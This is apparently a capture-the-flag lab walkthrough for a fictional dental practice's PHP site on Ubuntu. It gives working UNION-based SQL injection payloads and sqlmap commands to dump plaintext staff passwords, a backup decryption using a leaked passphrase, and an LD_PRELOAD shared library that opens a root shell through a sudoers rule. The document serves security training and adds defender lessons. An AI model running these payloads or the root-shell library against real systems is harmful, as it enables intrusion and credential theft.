# Marigold Family Dental — Lab Walkthrough

**Theme:** Marigold Family Dental is a fictional small dental practice
running a self-hosted PHP appointment site so front-desk staff can look up
booked appointments by patient last name. The search page was written by a
contractor who concatenated the search term straight into a SQL query — a
textbook SQL injection. A second, unrelated leftover (an OpenSSL-encrypted
staff-credential backup with its own passphrase sitting in a neighboring
"restore notes" file) and a third, unrelated misconfiguration (a sudoers
rule that leaks `LD_PRELOAD` into a root-run diagnostics tool) complete the
chain to root.

**Target OS:** Ubuntu Server (Linux) — chosen at random for this rotation.

**Scope / Legal notice:** This walkthrough is for use against the
`setup_marigolddental.sh` target running on your own isolated lab VM only.
Do not run these techniques against systems you do not own or lack
explicit authorization to test.

**Flags:**
- `EASY_FLAG.txt` — found in `front_desk`'s home directory after logging in
  with a credential leaked via SQL injection.
- `INTERMEDIATE_FLAG.txt` — found after decrypting a credential backup with
  a passphrase leaked in a neighboring file, and pivoting to `labtech`.
- `HARD_FLAG.txt` — found after privilege escalation to root via an
  `LD_PRELOAD` leak in a sudoers rule.

**Flag Hints** (try these before reading the full walkthrough):

<details>
<summary>Hint: EASY_FLAG</summary>

The appointment search box builds its database query straight out of
what you type. Try breaking the query with a single character and see
what the error message tells you.
</details>

<details>
<summary>Hint: INTERMEDIATE_FLAG</summary>

There's a backup file that's genuinely encrypted, sitting right next to
a document explaining exactly how to reverse that encryption. Read
before you crack.
</details>

<details>
<summary>Hint: HARD_FLAG</summary>

Check `sudo -l` for your pivoted account, paying attention to any
`Defaults` line as well as the command itself. One environment variable
in particular controls what gets loaded into a process before it even
starts running.
</details>

---

## Part 0 – Build

1. Provision a fresh Ubuntu Server 22.04/24.04 VM in an isolated, host-only
   or NAT'd network (no bridged/public NIC).
2. Copy `setup_marigolddental.sh` to the VM.
3. Run it:
   ```bash
   chmod +x setup_marigolddental.sh
   sudo ./setup_marigolddental.sh
   ```
4. Snapshot the VM once the script finishes — this is your clean restore
   point.
5. From your attacker VM (Kali, ParrotOS, etc.), confirm connectivity to
   the target's IP on the isolated network.

---

## Part 1 – Enumeration

Start with a full TCP port scan:

```bash
nmap -sC -sV -p- <target-ip> -oN nmap_full.txt
```

- `-sC` — run nmap's default script set (banner grabs, common misconfig
  checks) against open ports.
- `-sV` — probe open ports to determine service/version.
- `-p-` — scan all 65535 TCP ports instead of just the top 1000.
- `-oN nmap_full.txt` — save human-readable output for later reference.

Expect to see:
- `22/tcp` — OpenSSH
- `80/tcp` — Apache httpd, PHP

Note what's absent: `3306/tcp` (MariaDB) never appears — it's bound to
`127.0.0.1` only on this target.

Run a directory brute-force to confirm what's reachable beyond the linked
pages (nothing hidden turns up on this box, but it's good practice before
touching the app):

```bash
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirb/common.txt -x php -t 40
```

- `-u http://<target-ip>/` — target URL to scan.
- `-w /usr/share/wordlists/dirb/common.txt` — Kali's standard
  directory/filename wordlist.
- `-x php` — also try each wordlist entry with `.php` appended.
- `-t 40` — 40 concurrent threads.

```
/index.php     (Status: 200)
/search.php    (Status: 200)
```

Check the homepage source for context:

```bash
curl -s http://<target-ip>/ | grep -i form
```

```
<form method="get" action="search.php">
  Patient last name: <input name="lastname">
```

A GET-based search form with a single parameter, `lastname` — that
parameter is the entire attack surface for this box's initial-access
vulnerability.

---

## Part 2 – Identify Vulnerabilities

Three separate weaknesses need to be chained here before you reach root.

### 2a. Unsanitized SQL query in the appointment search (initial access)

`search.php` builds its query as
`"... WHERE patient_last_name = '$lastname'"`, concatenating the raw GET
parameter straight into the string with no prepared statement and no
escaping. Confirm it with a single quote:

```bash
curl -s "http://<target-ip>/search.php?lastname=Nguyen'"
```

```
Query error: You have an error in your SQL syntax; ... near '''
```

The raw MySQL syntax error confirms the input breaks out of the string
literal — a classic error-based signal that this parameter is injectable.

### 2b. Encrypted credential backup with the passphrase in a neighboring
     file (lateral movement, exploited in Part 4)

Not visible yet — this is discovered *after* you have a shell as
`front_desk`, in Part 4.

### 2c. `LD_PRELOAD` kept alive across a sudoers NOPASSWD rule
     (privilege escalation, confirmed in Part 5)

Also not visible yet — discovered after landing on `labtech`.

---

## Part 3 – Gain Access

**Step 1 — Confirm the injection point and column count.**

The query returns two columns (`appt_date`, `dentist`), so find that with
`ORDER BY`:

```bash
curl -s "http://<target-ip>/search.php?lastname=Nguyen' ORDER BY 3-- -"
```

Three or more columns errors out; two does not — confirming a 2-column
result set.

**Step 2 — Confirm a working UNION and pick a display column.**

```bash
curl -s "http://<target-ip>/search.php?lastname=zzz' UNION SELECT 'a','b'-- -"
```

```
<li>a with b</li>
```

The injected literals `a`/`b` render in the results list, confirming full
UNION-based injection and that both columns are visible in the output.

**Step 3 — Enumerate the database and table names.**

```bash
curl -s "http://<target-ip>/search.php?lastname=zzz' UNION SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema='marigold'-- -"
```

```
<li>marigold with appointments</li>
<li>marigold with staff_users</li>
```

`staff_users` is the interesting one.

**Step 4 — Enumerate its columns.**

```bash
curl -s "http://<target-ip>/search.php?lastname=zzz' UNION SELECT column_name, 'x' FROM information_schema.columns WHERE table_name='staff_users'-- -"
```

```
<li>id with x</li>
<li>username with x</li>
<li>password with x</li>
<li>role with x</li>
```

**Step 5 — Dump the credentials.**

```bash
curl -s "http://<target-ip>/search.php?lastname=zzz' UNION SELECT username, password FROM staff_users-- -"
```

```
<li>front_desk with butterfly1</li>
<li>dr_patel with not-the-shell-password</li>
```

`front_desk`'s password is stored in plaintext — bad practice by the
clinic's developer, and exactly what makes this box's initial access
possible. If you'd rather automate the whole enumeration instead of
hand-crafting each payload, `sqlmap` does the same thing end-to-end:

```bash
sqlmap -u "http://<target-ip>/search.php?lastname=Nguyen" --batch --dbs
sqlmap -u "http://<target-ip>/search.php?lastname=Nguyen" --batch -D marigold -T staff_users --dump
```

- `--batch` — accept sqlmap's default answer to every prompt.
- `--dbs` — list databases once injection is confirmed.
- `-D marigold -T staff_users --dump` — dump the specific table.

**Step 6 — Try the leaked credential over SSH.**

```bash
ssh front_desk@<target-ip>
# password: butterfly1
```

It works — the plaintext DB password was reused verbatim for the shell
account. Grab the first flag:

```bash
cat ~/EASY_FLAG.txt
```

**🚩 EASY_FLAG captured** — this one only required the SQL injection and
password reuse, no cracking required.

---

## Part 4 – Lateral Movement / Intermediate Challenge

As `front_desk`, look for anything Marigold-related outside your home
directory:

```bash
find / -iname "*marigold*" -readable 2>/dev/null
```

```
/var/backups/marigold
/var/backups/marigold/staff_export.csv.enc
/var/backups/marigold/restore_notes.txt
/etc/cron.d/marigold-backup
/var/log/marigold
```

`/etc/cron.d/marigold-backup` is just a routine heartbeat — not part of
the intended path. The backup directory is the one worth reading through:

```bash
cat /var/backups/marigold/restore_notes.txt
```

```
Marigold backup restore notes (IT handover doc - internal only)

The nightly staff-export backup is encrypted with OpenSSL AES-256-CBC.
To restore, decrypt with the shared backup passphrase:

    openssl enc -d -aes-256-cbc -pbkdf2 -in staff_export.csv.enc \
        -out staff_export.csv -pass pass:'M0lar-Backup-2026!'

Passphrase is also written on the sticky note on the server rack, ask
Priya if it's gone missing again.
```

Whoever wrote the restore instructions left the exact decryption
passphrase sitting right next to the file it unlocks. This isn't a hash to
crack offline — it's a straight symmetric decryption once you have the key,
a different primitive from dictionary/brute-force attacks. Run the command
exactly as documented:

```bash
cd /var/backups/marigold
openssl enc -d -aes-256-cbc -pbkdf2 -in staff_export.csv.enc \
    -out /tmp/staff_export.csv -pass pass:'M0lar-Backup-2026!'
cat /tmp/staff_export.csv
```

```
username,password,role
labtech,tinkerbell1,lab
```

Pivot to `labtech` (your session is a real TTY, so `su` works):

```bash
su labtech
# password: tinkerbell1
```

Grab the intermediate flag:

```bash
cat ~/INTERMEDIATE_FLAG.txt
```

**🚩 INTERMEDIATE_FLAG captured.**

(The credential also works directly over SSH if you'd rather pivot that
way instead of `su` — either gets you the same shell.)

---

## Part 5 – Privilege Escalation

From your `labtech` shell, check group memberships and what sudo rights
come with them:

```bash
id
sudo -l
```

```
uid=1002(labtech) gid=1002(labtech) groups=1002(labtech),1003(dental-ops)
Matching Defaults entries for labtech on this host:
    env_keep+="LD_PRELOAD"

User labtech may run the following commands on this host:
    (root) NOPASSWD: /usr/local/bin/dental-diag
```

Two things matter here together, not separately: `dental-ops` members can
run `/usr/local/bin/dental-diag` as root with no password, **and** the
sudoers `Defaults` line keeps `LD_PRELOAD` in the environment that sudo
passes through to the command it runs. Normally sudo strips almost every
environment variable for security — `env_keep+="LD_PRELOAD"` is an explicit
opt-out of that protection for this one variable. That means you can point
`LD_PRELOAD` at a shared library of your own, and the dynamic linker will
load it into the `dental-diag` process — running your code with root's
privileges — before the script itself ever runs. This is a completely
different bug from the SQL injection in Part 3 or the leaked passphrase in
Part 4: privilege escalation through the **dynamic linker**, not the sudo
target's own logic.

Build a malicious shared library whose constructor spawns a root shell the
moment it's loaded:

```bash
cat > /tmp/preload.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void hijack() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /tmp/preload.so /tmp/preload.c
```

- `__attribute__((constructor))` — runs this function automatically as
  soon as the shared library is loaded, before `dental-diag`'s own `main`
  ever executes.
- `-shared -fPIC` — compile as a position-independent shared object, the
  form `LD_PRELOAD` expects.

Trigger it through the sudoers rule:

```bash
sudo LD_PRELOAD=/tmp/preload.so /usr/local/bin/dental-diag
```

- `LD_PRELOAD=/tmp/preload.so` — normally sudo would erase this before
  running the command; the `env_keep` rule you saw in `sudo -l` is what
  lets it survive.
- Because sudo re-execs `dental-diag` as root, and the environment still
  carries your `LD_PRELOAD`, the loader pulls in `preload.so` as root and
  runs its constructor first — spawning a root shell before `dental-diag`
  prints a single diagnostics line.

```bash
id
```

You should see `uid=0(root)`.

---

## Part 6 – Capture the Three Flags

By the time you finish Part 5 you should have all three:

```bash
# Easy - front_desk's home dir, reached via SQL injection + password reuse (Part 3)
cat /home/front_desk/EASY_FLAG.txt

# Intermediate - labtech's home dir, reached via the leaked backup passphrase (Part 4)
cat /home/labtech/INTERMEDIATE_FLAG.txt

# Hard - root's home dir, reached via the LD_PRELOAD sudoers leak (Part 5)
cat /root/HARD_FLAG.txt
```

**🚩 EASY_FLAG, INTERMEDIATE_FLAG, and HARD_FLAG all captured.**

---

## Summary of the Vulnerability Chain

1. **Initial access — SQL injection:** `search.php` concatenates the
   `lastname` GET parameter directly into a SQL string with no prepared
   statement, allowing UNION-based extraction of the entire database,
   including a `staff_users` table that stores passwords in plaintext.
   That plaintext front-desk password was reused verbatim for a real
   interactive shell account, bridging the web foothold directly to SSH.
2. **Lateral movement — an encryption key left beside its own
   ciphertext:** a nightly backup routine encrypts a staff-credential
   export with OpenSSL, which is good practice on its own — but the
   passphrase needed to reverse it was written in plain text in a
   "restore notes" file stored in the very same directory, defeating the
   encryption entirely. This is a decrypt-with-a-leaked-key
   misconfiguration, a different primitive from offline hash cracking.
3. **Privilege escalation — `LD_PRELOAD` surviving sudo's environment
   scrub:** a sudoers `Defaults` line added `env_keep+="LD_PRELOAD"` so a
   maintenance group could run a diagnostics tool as root, without
   realizing that also lets any caller inject an arbitrary shared library
   into that root process via the dynamic linker — a distinct escalation
   primitive from SUID/PATH hijacks, plain sudo NOPASSWD/GTFOBins pivots,
   writable cron/systemd units, module-path hijacks, or misassigned
   capabilities used elsewhere in this lab set.

**Root cause lessons for defenders:**
- Always use parameterized queries/prepared statements — never build SQL
  by string concatenation, regardless of how "trusted" the input source
  seems.
- Never store passwords in plaintext, even in an internal staff table, and
  never reuse a database service password for an interactive shell
  account.
- Encryption is only as strong as key management: never store a
  passphrase or key alongside (or reachable by) the same principals who
  can read the ciphertext it protects.
- Never add environment variables to a sudoers `env_keep` list unless you
  fully understand what that variable controls — `LD_PRELOAD`,
  `LD_LIBRARY_PATH`, `PYTHONPATH`, and similar loader/interpreter
  variables are especially dangerous to keep, since they let a caller
  inject code into a process that's about to run as a higher-privileged
  user.

---

## Cleanup

This VM is now permanently vulnerable by design — don't reuse it as a
general-purpose machine. When you're done with the lab session:

1. Power off the VM.
2. Revert to (or delete) your pre-attack snapshot from Part 0.
3. If you don't need it again, delete the VM and its virtual disk entirely
   rather than repurposing it.
4. Rotate/discard any credentials you typed into other tools while
   practicing (e.g., don't reuse `butterfly1`, `tinkerbell1`, or
   `M0lar-Backup-2026!` anywhere real).
